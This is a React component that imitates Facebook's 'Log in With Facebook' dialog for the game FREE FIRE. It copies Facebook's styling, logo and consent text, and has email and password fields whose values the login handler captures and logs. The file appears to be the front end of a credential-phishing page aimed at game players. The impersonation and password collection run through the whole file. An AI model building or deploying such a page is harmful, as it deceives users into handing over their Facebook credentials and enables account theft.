import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { X } from 'lucide-react';

interface FacebookLoginModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  if (!isOpen) return null;

  const handleBackdropClick = (e: React.MouseEvent) => {
    if (e.target === e.currentTarget) {
      onClose();
    }
  };

  const handleLogin = () => {
    console.log('Login attempted with:', { email, password });
    onClose();
  };

  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm"
      onClick={handleBackdropClick}
    >
      <div className="relative bg-white rounded-xl shadow-2xl w-full max-w-md mx-4 min-h-[560px] flex flex-col">
        {/* Header */}
        <div className="bg-[#4267B2] text-white px-4 py-3 rounded-t-xl flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="w-6 h-6 bg-white rounded flex items-center justify-center">
              <span className="text-[#4267B2] font-bold text-sm" style={{ fontFamily: 'Arial, sans-serif' }}>f</span>
            </div>
            <span className="font-normal text-sm" style={{ fontFamily: 'Arial, sans-serif' }}>
              Log in With Facebook
            </span>
          </div>
          <button
            onClick={onClose}
            className="text-white hover:bg-white/20 rounded-full p-1"
          >
            <X size={16} />
          </button>
        </div>

        {/* Content */}
        <div className="flex-grow px-6 py-6 text-center flex flex-col justify-between">
          {/* Game Icon */}
          <div className="w-20 h-20 mx-auto mb-3 rounded-full overflow-hidden">
            <img
              src="https://i.ibb.co/DDmn9rp/unnamed.webp"
              alt="FREE FIRE"
              className="w-full h-full object-cover"
            />
          </div>

          {/* Title Text */}
          <div>
            <h2 className="text-gray-600 text-sm font-normal mb-1" style={{ fontFamily: 'Arial, sans-serif' }}>
              Log in to your Facebook account to
            </h2>
            <h3 className="text-gray-600 text-sm font-normal mb-4" style={{ fontFamily: 'Arial, sans-serif' }}>
              connect to FREE FIRE
            </h3>

            <p className="text-gray-400 text-xs mb-6" style={{ fontFamily: 'Arial, sans-serif' }}>
              This doesn't let the app post to Facebook.
            </p>
          </div>

          {/* Form */}
          <div className="space-y-3 font-sans">
            <input
              type="text"
              placeholder="Mobile number or email address"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full p-2.5 border border-gray-300 rounded-md text-xs bg-white text-black font-normal focus:outline-none focus:border-blue-500 placeholder:text-gray-500"
              style={{ fontFamily: 'Arial, sans-serif' }}
            />

            <div className="relative">
              <input
                type={showPassword ? 'text' : 'password'}
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full p-2.5 border border-gray-300 rounded-md text-xs bg-white text-black font-normal focus:outline-none focus:border-blue-500 pr-16 placeholder:text-gray-500"
                style={{ fontFamily: 'Arial, sans-serif' }}
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-[#4267B2] font-normal text-xs"
                style={{ fontFamily: 'Arial, sans-serif' }}
              >
                {showPassword ? 'HIDE' : 'SHOW'}
              </button>
            </div>

            <button
              onClick={handleLogin}
              className="w-full bg-[#4267B2] hover:bg-[#365899] text-white font-normal py-2.5 rounded-md text-sm"
              style={{ fontFamily: 'Arial, sans-serif' }}
            >
              Log In
            </button>
          </div>

          {/* Footer */}
          <div className="mt-6 text-[11px] text-gray-500 leading-relaxed" style={{ fontFamily: 'Arial, sans-serif' }}>
            <p>
              By continuing, FREE FIRE will receive ongoing access to the information that you share and Facebook will record when GARENA FREE FIRE accesses it.{' '}
              <span className="text-[#4267B2] cursor-pointer hover:underline">
                Learn more about this sharing and the settings that you have.
              </span>
            </p>

            <div className="mt-3 space-x-3">
              <span className="text-[#4267B2] cursor-pointer hover:underline">
                FREE FIRE Privacy Policy
              </span>
              <span className="text-gray-400">and</span>
              <span className="text-[#4267B2] cursor-pointer hover:underline">
                Terms
              </span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default FacebookLoginModal;
    
